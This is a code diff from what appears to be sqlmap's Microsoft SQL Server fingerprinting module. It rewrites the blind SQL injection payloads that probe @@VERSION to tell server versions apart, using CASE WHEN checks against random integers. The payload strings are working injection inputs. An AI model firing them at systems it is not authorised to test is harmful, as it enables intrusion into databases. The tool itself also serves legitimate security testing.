@@ -32,6 +32,7 @@ from lib.core.common import formatDBMSfp
 from lib.core.common import formatFingerprint
 from lib.core.common import getHtmlErrorFp
 from lib.core.common import getRange
+from lib.core.common import randomInt
 from lib.core.common import randomStr
 from lib.core.convert import urlencode
 from lib.core.data import conf
@@ -192,10 +193,12 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
             logger.info(infoMsg)
 
             for version in ( 0, 5, 8 ):
-                payload = agent.fullPayload(" AND ( ( SUBSTRING((@@VERSION), 22, 1)=2 AND SUBSTRING((@@VERSION), 25, 1)=%d ) OR ( SUBSTRING((@@VERSION), 23, 1)=2 AND SUBSTRING((@@VERSION), 26, 1)=%d ) )" % (version, version))
+                randInt = randomInt()
+                query   = " AND %d=(SELECT (CASE WHEN (( SUBSTRING((@@VERSION), 22, 1)=2 AND SUBSTRING((@@VERSION), 25, 1)=%d ) OR ( SUBSTRING((@@VERSION), 23, 1)=2 AND SUBSTRING((@@VERSION), 26, 1)=%d )) THEN %d ELSE %d END))" % (randInt, version, version, randInt, (randInt + 1))
+                payload = agent.fullPayload(query)
                 result  = Request.queryPage(payload)
 
-                if result == True:
+                if result is True:
                     if version == 8:
                         kb.dbmsVersion = [ "2008" ]
 
@@ -212,7 +215,8 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
                         break
 
                     else:
-                        payload = agent.fullPayload(" AND SUBSTRING((@@VERSION), 22, 1)=7")
+                        query   = " AND %d=(SELECT (CASE WHEN (SUBSTRING((@@VERSION), 22, 1)=7) THEN %d ELSE %d END))" % (randInt, randInt, (randInt + 1))
+                        payload = agent.fullPayload(query)
                         result  = Request.queryPage(payload)
 
                         if result == True:
